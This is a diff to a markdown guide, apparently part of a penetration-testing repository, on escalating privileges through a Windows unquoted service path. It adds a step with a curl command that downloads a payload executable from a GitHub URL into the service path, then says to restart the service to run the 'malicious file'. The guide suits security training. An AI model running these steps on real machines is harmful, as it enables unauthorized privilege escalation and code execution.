@@ -490,7 +490,17 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 
    - Use a tool like [bat2exe](https://bat2exe.net/) to convert the batch file into an executable file (`Common.exe`).
 
-4. **Place Executable:**
+4. **Optional: Download the Executable Payload:**
+
+   - If you already have the executable payload hosted somewhere, you can download it using the following `curl` command:
+
+     ```bash
+     curl -o "C:\Program Files\Unquoted Path Service\Common Files\Common.exe" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/payloads/Common.exe
+     ```
+
+     > **Note:** Modify the destination path (`"C:\Program Files\Unquoted Path Service\Common Files\Common.exe"`) to your desired location and file name, if necessary.
+
+5. **Place Executable:**
 
    - Save the newly created `Common.exe` into:
 
@@ -498,7 +508,7 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
      C:\Program Files\Unquoted Path Service\Common Files\
      ```
 
-5. **Restart the Service:**
+6. **Restart the Service:**
 
    - Restart the vulnerable service to trigger the execution of your malicious file:
 
